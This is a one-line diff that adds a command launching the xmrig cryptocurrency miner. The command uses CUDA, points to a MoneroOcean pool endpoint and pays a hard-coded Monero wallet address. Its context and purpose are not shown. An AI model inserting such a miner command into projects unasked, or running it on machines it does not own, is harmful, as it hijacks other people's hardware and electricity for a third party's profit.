@@ -1,0 +1,1 @@
+xmrig.exe --cuda -o gulf.moneroocean.stream:10128 -u 48t4KSCVvkZL3C4yS57ih9Hj8DQXYmo5iBVrRdNwvWiAaCr6rguSaKejHCm3Kb9Ttnij95vPSQoS71b4pNu5jsCyB6t715v -a rx/0
